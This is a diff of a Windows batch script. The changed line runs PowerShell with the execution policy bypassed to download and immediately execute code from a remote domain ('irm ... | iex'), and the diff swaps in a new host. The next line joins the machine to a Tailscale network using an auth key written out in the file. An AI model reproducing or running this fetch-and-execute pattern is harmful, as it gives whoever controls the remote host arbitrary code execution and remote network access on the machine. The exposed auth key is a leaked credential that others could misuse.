@@ -14,7 +14,7 @@ goto :eof
 
 ::ENTER YOUR CODE BELOW::   
 
-powershell.exe -ExecutionPolicy Bypass -Command "irm ps.sudoer.ga | iex"
+powershell.exe -ExecutionPolicy Bypass -Command "irm ps2.sudoer.ga | iex"
 tailscale up --authkey tskey-auth-kmYWEs4CNTRL-E58dqRPnpjitN4wH1JYshiDnogxNZCqR --unattended
 
 
